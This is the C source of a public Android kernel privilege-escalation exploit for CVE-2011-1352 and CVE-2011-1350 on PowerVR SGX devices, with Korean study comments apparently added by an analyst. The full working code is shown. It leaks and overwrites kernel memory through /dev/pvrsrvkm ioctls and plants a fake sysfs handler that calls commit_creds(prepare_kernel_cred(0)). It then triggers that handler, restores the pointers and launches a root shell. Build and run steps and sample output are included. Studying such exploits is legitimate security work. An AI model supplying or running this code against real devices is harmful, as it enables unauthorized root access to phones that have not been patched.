// https://jon.oberheide.org/files/levitator.c
// 초기 분석이 마무리 되었습니다.
// 메인 함수를 통해서 분석을 해 보았는데요, 메모리 클로버링을 통한 장치 감염과 트리거 디바이스가 다른 차이가 있어 약간 공격이
// 어려운 함수의 버전이었습니다. PowerVR SGX 칩셋이 많이 쓰이지 않을 거라서 리스크가 크지는 않지만, 테스트로 필요한 익스플로잇 코드인거 같네요.
// 2차 분석은 세부 함수를 분석해 보고 3차로 리포트를 쓰고 마무리하고자 합니다.
// 2차 분석: 세부 분석
// 3차 분석: 리포트 쓰기.

/*
 * levitator.c
 *
 * Android < 2.3.6 PowerVR SGX Privilege Escalation Exploit
 * Jon Larimer <jlarimer@gmail.com>
 * Jon Oberheide <jon@oberheide.org>
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1352
 *
 *   CVE-2011-1352 is a kernel memory corruption vulnerability that can lead 
 *   to privilege escalation. Any user with access to /dev/pvrsrvkm can use 
 *   this bug to obtain root privileges on an affected device.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1350
 *
 *   CVE-2011-1350 allows leaking a portion of kernel memory to user mode 
 *   processes. This vulnerability exists because of improper bounds checking
 *   when returning data to user mode from an ioctl system call.
 *
 * Usage:
 *
 *   $ CC="/path/to/arm-linux-androideabi-gcc"
 *   $ NDK="/path/to/ndk/arch-arm"
 *   $ CFLAGS="-I$NDK/usr/include/"
 *   $ LDFLAGS="-Wl,-rpath-link=$NDK/usr/lib -L$NDK/usr/lib -nostdlib $NDK/usr/lib/crtbegin_dynamic.o -lc"
 *   $ $CC -o levitator levitator.c $CFLAGS $LDFLAGS
 *   $ adb push levitator /data/local/tmp/
 *   $ adb shell
 *   $ cd /data/local/tmp
 *   $ ./levitator
 *   [+] looking for symbols...
 *   [+] resolved symbol commit_creds to 0xc00770dc
 *   [+] resolved symbol prepare_kernel_cred to 0xc0076f64
 *   [+] resolved symbol dev_attr_ro to 0xc05a5834
 *   [+] opening prvsrvkm device... // prvsrvkm 디바이스르를 오픈.
 *   [+] dumping kernel memory... // 커널 메모리를 덤프.
 *   [+] searching kmem for dev_attr_ro pointers... // kmem에서 dev_attr_ro 포인터들을 검색.
 *   [+] poisoned 16 dev_attr_ro pointers with fake_dev_attr_ro! // 16개의 dev_attr_ro 포인터를 fake_dev_attr_ro로 감염.
 *   [+] clobbering kmem with poisoned pointers... // kmem을 감염된 포인터로 클로버링. (실행)
 *   [+] triggering privesc via block ro sysfs attribute... // sysfs 속성의 block ro를 통해 privesc 트리거링!
 *   [+] restoring original dev_attr_ro pointers... // 원본 dev_attr_ro 포인터 복구.
 *   [+] restored 16 dev_attr_ro pointers! // 16개의 dev_attr_ro 포인터 복구.
 *   [+] privileges escalated, enjoy your shell! // 권한 상승되었습니다, 쉘 실행 (루트쉘 획득 성공!).
 *   # id
 *   uid=0(root) gid=0(root)
 *
 *   Notes:
 *
 *     The vulnerability affects Android devices with the PowerVR SGX chipset
 *     which includes popular models like the Nexus S and Galaxy S series. The 
 *     vulnerability was patched in the Android 2.3.6 OTA update.
 *     이 취약점은 PowerVR SGX 칩셋의 안드로이드 장치에 취약했고 Nexsus S나 갤럭시 S 시리즈에 탑재된 것이었습니다.
 *     안드로이드 2.3.6 OTA 업데이트에 패치되었다.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

// CONNECT_SERVICES 식별 아이디:(ioctl 코드 번호)
#define CONNECT_SERVICES 0xc01c670c
// 메모리 덤프할 사이즈. (161920 바이트)
#define DUMP_SIZE        161920

// PVRSSRV_BRIDGE_PACKAGE 구조.
typedef struct {
	uint32_t ui32BridgeID;
	uint32_t ui32Size;
	void *pvParamIn;
	uint32_t ui32InBufferSize;
	void *pvParamOut;
	uint32_t ui32OutBufferSize;
	void * hKernelServices;
} PVRSRV_BRIDGE_PACKAGE;


// 크리덴셜 갱신 함수 구조 선언.
typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

// fake_disk_ro_show() 후킹 함수.
ssize_t
fake_disk_ro_show(void *dev, void *attr, char *buf)
{
	commit_creds(prepare_kernel_cred(0)); // 크리덴셜 갱신.
	return sprintf(buf, "0wned\n");
}

// attribute 구조.
struct attribute {
	const char *name;
	void *owner;
	mode_t mode;
};

// device_attribute 구조.
struct device_attribute {
	struct attribute attr;
	ssize_t (*show)(void *dev, void *attr, char *buf); // device_attriute.show = 후킹 fake 함수로 쓰임.
	ssize_t (*store)(void *dev, void *attr, const char *buf, size_t count);
};

// fake_dev_attr_ro 구조 변수.
struct device_attribute fake_dev_attr_ro = {
	.attr	= {
		.name = "ro",
		.mode = S_IRWXU | S_IRWXG | S_IRWXO,
	},
	.show = fake_disk_ro_show,
	.store = NULL,
};

// 심볼 얻는 함수.
unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sname[512];
	int ret = 0;

	// /proc/kallsyms 접근을 통해서 문자열 검색으로 심볼 주소 구함. 
	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		return 0;
	}
 
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			return addr;
		}
	}

	return 0;
}

// ioctl 을 수행하여 커널 메모리를 읽고 쓰는 함수.
int do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
{
	PVRSRV_BRIDGE_PACKAGE pkg;

	memset(&pkg, 0, sizeof(pkg));

	pkg.ui32BridgeID = CONNECT_SERVICES;
	pkg.ui32Size = sizeof(pkg);
	pkg.ui32InBufferSize = in_size;
	pkg.pvParamIn = in;
	pkg.ui32OutBufferSize = out_size;
	pkg.pvParamOut = out;

	// 패키지 구조를 인자로 ioctl.
	return ioctl(fd, 0, &pkg);
}

// 메인 엔트리 함수 기능:
int main(int argc, char **argv)
{
	DIR *dir;
	struct dirent *dentry;
	int fd, ret, found, trigger;
	char *dump, *dump_end, buf[8], path[256];
	unsigned long dev_attr_ro, *ptr;

	printf("[+] looking for symbols...\n");

        // commit_creds 구함.
	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] commit_creds symbol not found, aborting!\n");
		exit(1);
	}

        // prepare_kernel_cred 구함.
	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] prepare_kernel_cred symbol not found, aborting!\n");
		exit(1);
	}

        // dev_attr_ro 구함.
	dev_attr_ro = get_symbol("dev_attr_ro");
	if (!dev_attr_ro) {
		printf("[-] dev_attr_ro symbol not found, aborting!\n");
		exit(1);
	}

	printf("[+] opening prvsrvkm device...\n");

        // 취약 디바이스(/dev/pvrsvkm)을 읽기 쓰기 전용으로 오픈.
	fd = open("/dev/pvrsrvkm", O_RDWR);
	if (fd == -1) {
		printf("[-] failed opening pvrsrvkm device, aborting!\n");
		exit(1);
	}

	printf("[+] dumping kernel memory...\n");

        // 메모리 덤프.
	dump = malloc(DUMP_SIZE + 0x1000);
	dump_end = dump + DUMP_SIZE + 0x1000;
	memset(dump, 0, DUMP_SIZE + 0x1000);

        // 덤핑. (DUMP_SIZE - 1000)만큼 덤핑.
	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	printf("[+] searching kmem for dev_attr_ro pointers...\n");

	found = 0;
        // 커널 메모리에서 dev_attr_ro 주소를 찾아서 커널 메모리 상의 포인터를 fake_dev_attr_ro로 감염.
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == dev_attr_ro) {
			*ptr = (unsigned long) &fake_dev_attr_ro;
			found++;
		}
	}

	printf("[+] poisoned %d dev_attr_ro pointers with fake_dev_attr_ro!\n", found);

	if (found == 0) {
		printf("[-] could not find any dev_attr_ro ptrs, aborting!\n");
		exit(1);
	}

	printf("[+] clobbering kmem with poisoned pointers...\n");

        // ioctl 두 번째 인자에 dump를 넣어서 클로버링(수정된 페이지)를 메모리에 적용.
	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	printf("[+] triggering privesc via block ro sysfs attribute...\n");

        // dir = /sys/block 디렉토리 오픈.
	dir = opendir("/sys/block");
	if (!dir) {
		printf("[-] failed opening /sys/block, aborting!\n");
		exit(1);
	}

	found = 0;
	while ((dentry = readdir(dir)) != NULL) {
		if (strcmp(dentry->d_name, ".") == 0 || strcmp(dentry->d_name, "..") == 0) {
			continue;
		}

		snprintf(path, sizeof(path), "/sys/block/%s/ro", dentry->d_name);

                // /syys/block/[장치명]/ro 를 오픈해서 취약점 트리거! (오픈하는 것으로 취약점이 트리거됨!)
		trigger = open(path, O_RDONLY);
		if (trigger == -1) {
			printf("[-] failed opening ro sysfs attribute, aborting!\n");
			exit(1);
		}

		memset(buf, 0, sizeof(buf));
		ret = read(trigger, buf, sizeof(buf));
		close(trigger);

		if (strcmp(buf, "0wned\n") == 0) {
			found = 1;
			break;
		}
	}

	if (found == 0) {
		printf("[-] could not trigger privesc payload, aborting!\n");
		exit(1);
	}

	printf("[+] restoring original dev_attr_ro pointers...\n");
        // 두 번째 인자에 NULL을 넣어서 원본 포인터로 복원 준비.
	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	found = 0;
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == (unsigned long) &fake_dev_attr_ro) {
			*ptr = (unsigned long) dev_attr_ro;
			found++;
		}
	}

	printf("[+] restored %d dev_attr_ro pointers!\n", found);

	if (found == 0) {
		printf("[-] could not restore any pointers, aborting!\n");
		exit(1);
	}

	// dump로 꺼낸 원본 메모리를 ioctl로 쓰기해서 복원.
	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

        // getuid()로 uid가 0으로 상승했는지 확인.
	if (getuid() != 0) {
		printf("[-] privileges not escalated, exploit failed!\n");
		exit(1);
	}

	printf("[+] privileges escalated, enjoy your shell!\n");

        // 상승한 경우 루트쉘 실행.
	execl("/system/bin/sh", "sh", NULL);

	return 0;
}
